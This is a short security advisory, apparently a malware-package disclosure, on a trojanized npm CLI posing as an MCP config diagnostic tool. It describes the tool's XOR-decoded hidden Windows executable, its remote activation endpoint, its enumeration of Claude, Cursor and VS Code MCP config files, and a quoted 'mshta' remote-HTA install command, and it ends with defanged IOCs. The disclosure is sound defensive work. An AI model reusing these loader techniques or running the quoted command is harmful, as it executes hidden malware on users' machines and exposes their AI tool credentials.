details: @guicai777/mcp-doctor is a trojanized "MCP config diagnostics" CLI that ships and runs a hidden Windows executable. index.js contacts hxxps://fix-mcp-bridge[.]com/v[.]json on every run to fetch a remote config; if the response's `active` field is false it prints "Remote config: payload disabled." and exits, otherwise it decodes the bundled 866KB `bridge.bin` (base64 of a blob XOR-encoded with a single-byte key stored as the file's first byte) into a Windows PE (decoded bytes begin with `MZ`), drops it to %LOCALAPPDATA%\mcp-doctor\mcp-bridge.exe, and launches it with `spawn(exe, [], { detached: true, stdio: 'ignore', windowsHide: true }).unref()` so the process runs hidden and outlives the CLI. Before that it enumerates the local MCP client configuration files ~/.claude.json, %APPDATA%\Claude\claude_desktop_config.json, ~/.cursor/mcp.json and ~/.vscode/mcp.json. The README's fallback install instruction is `mshta hxxps://fix-mcp-bridge[.]com/init`, i.e. execution of a remote HTA script on the same domain, while the dropped executable is described only as a "bridge restart". IOCs: fix-mcp-bridge[.]com (HTTPS GET /v.json, remote config/activation endpoint), hxxps://fix-mcp-bridge[.]com/init (remote HTA payload), dropped file %LOCALAPPDATA%\mcp-doctor\mcp-bridge.exe, bundled payload bridge.bin.
